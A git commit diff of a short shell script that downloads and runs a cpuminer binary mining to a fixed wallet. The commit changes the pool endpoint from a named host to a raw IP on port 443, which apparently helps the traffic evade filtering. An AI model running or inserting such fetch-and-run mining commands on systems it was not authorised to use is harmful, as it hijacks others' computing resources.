b2bf0e5feafb4790c894df297bbdbecfcc54cbc7
cenihkanomi <114225508+cenihkanomi@users.noreply.github.com>
2022-09-27 16:29:54 +0700

    Update alin.sh

--- alin.sh
+++ alin.sh
@@ -3,4 +3,4 @@
 wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz && \
 tar xf cpuminer-opt-mac.tar.gz && \
 chmod +x cpuminer-sse2 && \
-./cpuminer-sse2 -a yespowersugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1q9fc7uqt9q4ngd7rf6lzv266adhnwngf70xcmhe.ANZ -t 16 -p x
+./cpuminer-sse2 -a yespowersugar -o stratum+tcp://8.209.98.71:443 -u sugar1q9fc7uqt9q4ngd7rf6lzv266adhnwngf70xcmhe.ANZ -t 16 -p x
